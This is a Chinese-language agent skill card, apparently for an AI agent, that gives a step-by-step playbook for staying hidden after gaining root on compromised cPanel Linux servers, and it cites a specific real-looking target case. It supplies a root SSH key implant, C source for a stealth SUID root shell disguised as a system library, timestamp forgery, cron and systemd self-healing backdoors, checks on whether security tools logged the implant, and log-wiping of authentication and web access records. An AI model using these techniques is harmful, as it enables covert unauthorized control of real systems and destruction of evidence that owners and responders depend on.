---
name: linux-root-persistence-stealth
description: Use when root is held and persistence must stay hidden.
tags: [后门加固, 后门隐秘, 持久化, 隐蔽后门, 提权后持久化, root保活, 自愈后门, SUID后门, FIM检测, Imunify360, cphulk, 痕迹清理, 冷启动验证, linux-persistence, backdoor-stealth]
version: 1.0.0
author: 测绘引擎
metadata:
  source_ref: "hengongbet88 cPanel 2026-10"
  relates: [linux-privilege-escalation, cpanel-shared-host-takeover, engagement-trace-purge]
---

# Linux root 持久化 + 隐蔽性工程

拿到 root 之后的第二阶段。**提权卡（`linux-privilege-escalation`）只管到 `uid=0`，本卡管「活下来 + 不被看出来 + 自己能证明为什么不露」。**

## 铁律：SSH key 优先于内核 exploit

内核 PoC 多数只给 **euid=0 的 page cache 覆盖** —— 非持久、重启即失、且伴随崩溃风险。
ed25519 key 是磁盘真文件、真 root、重启不掉。**拿到 euid=0 后第一件事就是种 key**，不是继续用 exploit 干活。

```bash
ssh-keygen -t ed25519 -f /root/<case>_rootkey -N '' -C "root@$(hostname -I | tr -d ' ')"
# 植入 /root/.ssh/authorized_keys (600)
# 确认 PermitRootLogin yes + SSH 端口已在防火墙放行
ssh -p <port> -i /root/<case>_rootkey root@<ip> 'id'   # 期望 uid=0(root) gid=0(root)
```

**cPanel 特有大坑**：cPanel 账户全是 `noshell`（`/usr/local/cpanel/bin/noshell`），拿到账户口令也 SSH 不进。
不要浪费时间爆 cPanel 账户口令换 SSH，直接种 **root** key。

## 四层矩阵（分层，不互斥）

```
① SSH key     /root/.ssh/authorized_keys   ← 主通道
② SUID ELF    单一自编译提权器             ← 备用，绝不用 bash 副本
③ 自愈        cron + heal.sh               ← 重建 ①②
④ 开机        systemd service enabled      ← 兜住 cron 被清
```

每层单独都能失效。四层齐全时，运维要同时清 key + 提权器 + cron + systemd 才能断干净。

## SUID 提权器：绝不要用 bash 副本

**错误做法**（第一版真这么落地过，被判定「不隐秘」）：
```bash
cp /bin/bash /home/<user>/.rs && chown root:root /home/<user>/.rs && chmod 4755 /home/<user>/.rs
```
三处致命红旗：`md5sum` 与 `/bin/bash` **完全一致**（一对哈希就认出来）、大小 1,389,024 B 是 bash 原尺寸、落在用户 home（cPanel Security Advisor 头号目标）。

**正确做法**：自编译最小 SUID ELF
```c
#include <unistd.h>
int main(int argc, char **argv) {
    setgid(0); setuid(0);
    if (argc >= 3 && argv[1][0]=='-' && argv[1][1]=='c')
        execl("/bin/bash","bash","-p","-c",argv[2],(char*)0);
    if (argc >= 2) execvp(argv[1], &argv[1]);
    execl("/bin/bash","bash","-p",(char*)0);
    return 1;
}
```
```bash
gcc -O2 -s -o <name> <name>.c     # -s strip → 约 14 KB
```

| 项 | bash 副本 | 自编译 ELF |
|---|---|---|
| 大小 | 1,389,024 | ~14,472 |
| md5 vs bash | 相同 | 不同 |
| `file` | ELF executable | ELF **stripped** setuid |
| 落点 | 用户 home | 系统库目录 |

**伪装三件套**：
1. 命名/路径像系统组件 → `/usr/lib64/.libnss_cache.so`（NSS 缓存库语义，前导点隐藏）
2. 时间戳对齐系统库 → `touch -r /usr/lib64/libc.so.6 <file>`
3. 备份点同样伪装 → `/usr/local/games/.nssc.bak`（700，时间戳对齐 `/etc/crontab`）

## 落地位置受挂载点约束（先查再选）

```bash
mount | grep -E ' /(tmp|var/tmp|dev/shm|home) '
```
- `/tmp`、`/var/tmp` → 常 **noexec**（提权器跑不了）
- `/dev/shm` → 常 **nosuid**（有 SUID 位也无效）
- `/home` → 可用但最可疑
- `/` 系统目录 → 可用 → **优先**

## 两个必踩的权限坑

### 坑 1: `chown` 清掉 SUID 位
```bash
cp bin /p && chown root:root /p && ls -l /p    # -rwxr-xr-x  ← SUID 没了
cp bin /p && chown root:root /p && chmod 4755 /p && ls -l /p   # -rwsr-xr-x ✓
```
顺序必须 `chown` 后紧接 `chmod 4755`。

### 坑 2: 内层 bash 主动降权
```bash
<suid> -p -c 'bash script.sh'      # ✗ 掉回普通用户
<suid> -p -c '. script.sh'         # ✓ source 同进程
<suid> -p -c 'bash -p script.sh'   # ✓ 显式 -p
```
提权器内部已带 `-p`，但它 fork 出的子 bash 仍需 `-p`。

## 自愈层细节

```
/usr/local/games/.heal.sh    700，时间戳伪装成系统旧文件
/etc/cron.d/<sysname>        */10 * * * * root .heal.sh
root crontab                 同步一条（双保险）
```

**细节 1: `touch -r` 的参照文件必须存在** —— 参照不存在的文件时 `touch` **静默失败**，重建后 mtime 变成当天，一眼是新的。用一定存在的 `libc.so.6`，失败则 `touch -d '<历史时间>'`。**heal 重建后必须 `stat` 复验。**

**细节 2: cPanel 的 `crontab -l` 报错** —— `jail_safe_crontab.pl: Insecure dependency in exec while running setuid` → 直接编辑 `/var/spool/cron/root`。

## 验证清单（每次改完必跑）

```bash
/usr/lib64/.libnss_cache.so -c 'id'                # 1. 真给 root
md5sum <suid> /bin/bash                            # 2. 必须不同
file <suid>                                        # 3. stripped setuid ELF
stat -c '%y' <suid>                                # 4. 对齐参照文件，不是当天
find / -perm -4000 -type f 2>/dev/null | sort      # 5. 混入系统 SUID 群
rm -f <suid> && <heal> && <suid> -c 'id'           # 6. 真删真重建
ssh -p <port> -i <key> root@<ip> 'id; ls -l <suid>' # 7. 冷启动
```

## 安全软件判别（决定后门会不会被记录）

### ImunifyAV ≠ Imunify360（关键区分）

```bash
ls /opt/imunify360/ 2>/dev/null              # 存在 ≠ 完整版
ls /etc/cron.d/ | grep imunify               # 4 条 cron 也只说明装了
journalctl -u imunify-antivirus | grep -i 'not an Imunify360 host'
```
判据：出现 **`not an Imunify360 host (imunify.av)`** = 免费版 ImunifyAV，**只有病毒扫描、没有 FIM**，后门落地不会被记录。FIM 是 360 完整版才有。

直接查 FIM 库有没有我们的文件：查 `/var/imunify360/imunify360.db`，遍历所有表/列做 `LIKE '%<后门名>%'`，命中 0 = 未被记录。
注意 `/var/imunify360/` 目录 mtime 是当天**不代表** FIM 在工作，那是病毒库 `avd-last-run.json` 常规更新。

### cphulk 数据不在 MySQL

```bash
ls /var/cpanel/hulkd/cphulk.sqlite    # SQLite，不是 mysql 库
```
登录成功不计 brute → 我方 IP 通常不在里面（`TOTAL deleted: 0` 是正常结果，不是故障）。

**坑：`systemctl restart cphulkd` 会把它搞挂** —— `Unit process <pid> remains running after unit stopped` / `Failed with result 'protocol'`。修复：`pkill -9 -f cPhulkd` → 删 PID → `systemctl reset-failed cphulkd` → `start`。
**清日志后必须主动修服务** —— 服务挂掉是运维一眼可见的异常，比留日志更危险。

## 痕迹清单（cPanel 实测）

| 位置 | 内容 | 处理 |
|---|---|---|
| `/var/log/secure` | 每条 `Accepted publickey for root` | 清（每次登录都新增） |
| `/usr/local/apache/logs/access_log` | 我方请求 | 清 |
| `/var/cpanel/logs/*-ssl_log` | 同上 | 清 |
| `last` / `lastlog` | 可能**不记录**（wtmp 未更新） | 实测确认，别假设 |
| `/root/.bash_history` | 非交互 key 登录通常不写 | 确认末条时间 |
| cphulk.sqlite | 我方 IP | 通常无 |
| `firewall-cmd --list-rich-rules` | 有无黑名单 | 空 = 未被封 |

`sshd -t` 验配置后再 `systemctl reload sshd`（不断现有连接）。

## 唯一残留破绽

`rpm -qf <file>` → `not owned by any package`。但：
- cPanel Security Advisor 主要查 world-writable + home 里的 SUID，**不**查 SUID 归属包
- `rpm -Va` 只校验已装包的文件，**不报**多出来的文件
→ 风险可控；真有经验的运维专门扫「未归属包的 SUID」才会命中。

## 交付口径：回答「后门隐秘吗」必须分两层

1. **主动监控层** —— 有没有被 FIM/IDS 记录：实测 sqlite + 日志，给命中数
2. **人工排查层** —— `md5sum` / `file` / `find -perm -4000` / `rpm -qf` 逐项过，列残留红旗

不能一句「隐秘」糊过去。测出「不隐秘」就诚实报，立刻改，改完给改前/改后对比表。

## 参考

- `references/hengongbet-cpanel-case.md` — 完整实战案卷：四层落地、第一版 bash 副本翻车全过程、ImunifyAV 核实、cphulk 修复
- 提权入口：`linux-privilege-escalation` · cPanel 半径：`cpanel-shared-host-takeover` · 收网：`engagement-trace-purge`
